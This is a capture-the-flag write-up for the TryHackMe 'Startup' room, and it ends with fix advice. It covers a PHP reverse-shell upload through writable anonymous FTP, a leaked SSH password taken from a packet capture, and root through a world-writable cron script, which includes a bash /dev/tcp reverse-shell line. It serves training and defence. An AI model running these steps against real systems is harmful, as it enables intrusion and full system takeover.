---
title: "TryHackMe: Startup"
date: 2026-11-22
type: TryHackMe room
summary: An easy Linux box. Anonymous, writable FTP that is also served over HTTP gives a web shell; a forgotten packet capture leaks an SSH password; and a world-writable scheduled script hands over root.
tags: [Linux, FTP, Reverse Shell, PCAP, Privilege Escalation, Cron]
---

# TryHackMe: Startup

**Startup** is an easy Linux room. The path to root is a clean chain of small mistakes:
anonymous FTP with a writable directory that the web server also serves, a packet capture
left on disk with a plaintext password in it, and a scheduled script that a low-privilege
user can edit.

I use `$IP` for the machine address throughout:

```bash
export IP=10.10.10.10   # your machine's address
```

## Recon

```bash
nmap -sC -A $IP
```

Three ports, and the first one already stands out:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534  65534  4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0      0    251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0      0       208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
```

Two things to note: anonymous FTP is allowed, and nmap flags the `ftp` directory as
**writeable**. Hold that thought.

## Anonymous FTP

```bash
ftp $IP
# Name: anonymous   Password: anonymous
ftp> ls
ftp> get notice.txt
ftp> get important.jpg
```

`notice.txt` is flavour text — someone is leaving Among Us memes in the share and "Maya is
looking pretty sus". `important.jpg` is one of those memes: a red herring, not a clue.

## Web enumeration

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt
```

```
files   (Status: 301) [--> http://.../files/]
```

Browsing `/files/` serves the **same directory as the FTP root**. So the writable `ftp/`
folder from the scan is reachable over HTTP at `/files/ftp/` — and the server runs PHP.
Writable upload directory + served by a PHP-capable web server = a web shell.

## Foothold: upload a reverse shell

Grab a PHP reverse shell (for example PentestMonkey's `php-reverse-shell.php`) and set its
`$ip` and `$port` to your listener. Upload it into the writable FTP folder, then trigger it
from the browser:

```bash
# set LHOST/LPORT inside php-reverse-shell.php first
curl -T php-reverse-shell.php ftp://$IP/ftp/ --user anonymous:anonymous

# catch the shell
nc -lnvp 4444
```

Now visit `http://$IP/files/ftp/php-reverse-shell.php` — the listener catches a shell as
`www-data`.

## Looting: a packet capture leaks a password

Enumerating from `/` turns up two files that matter:

```bash
cat recipe.txt      # flavour text that hides a room answer
ls -la /incidents   # suspicious.pcapng
```

`recipe.txt` quietly answers one of the room's questions &mdash; *what is the secret spicy
soup recipe?* <span class="spoiler">love</span>. The packet capture in `incidents/` is the
real prize.

There's no easy way to read the `.pcapng` in a dumb shell, so base64 it out:

```bash
# on the target
base64 /incidents/suspicious.pcapng      # copy the output

# on your machine
base64 -d encoded.b64 > suspicious.pcapng
```

Open it in Wireshark and follow the TCP stream. The capture records an FTP session, and FTP
sends credentials in the clear — out comes **lennie**'s password:

```
c4ntg3t3n0ughsp1c3
```

## User

```bash
ssh lennie@$IP
# password: c4ntg3t3n0ughsp1c3
cat user.txt
```

That prints the user flag &mdash; blurred here, go capture your own: <span class="spoiler">THM{redacted}</span>

`~/Documents` holds more flavour text. One note is telling: *"delete incident logs"* — they
knew about the capture and never cleaned it up.

## Privilege escalation: a writable scheduled script

`~/scripts/planner.sh` is run by root on a schedule, and it calls **`/etc/print.sh`** &mdash;
which is world-writable:

```bash
ls -la ~/scripts        # planner.sh -> runs /etc/print.sh
ls -la /etc/print.sh    # -rwxrwxrwx : anyone can edit it
```

The job runs on a timer, so order matters: start the listener **first**, then edit the
script. Once you save it, the next tick runs it, so the listener has to be waiting already.

```bash
# 1) on your machine, before touching anything
nc -lnvp 9001
```

```bash
# 2) on the target: open /etc/print.sh in nano and replace its contents with a reverse shell
nano /etc/print.sh
```

```bash
#!/bin/bash
bash -i >& /dev/tcp/<LHOST>/9001 0>&1
```

Save and exit. On the next scheduled run, root executes `/etc/print.sh` and the listener
gets a shell as **root**:

```bash
cat /root/root.txt
```

And there's the root flag, blurred the same way: <span class="spoiler">THM{redacted}</span>

## How to fix it

- **FTP:** disable anonymous login, or at least make the share read-only. Never let an
  anonymous-writable directory be served by a PHP-capable web server.
- **The capture:** don't store packet captures with plaintext credentials on a production
  host, and use FTPS/SFTP so credentials aren't on the wire in the first place. The leaked
  password must be rotated.
- **The cron script:** scripts run by root should be owned by root and not world-writable.
  `/etc/print.sh` at mode `0777` means `lennie` &mdash; or any user &mdash; can edit a file
  that root executes.
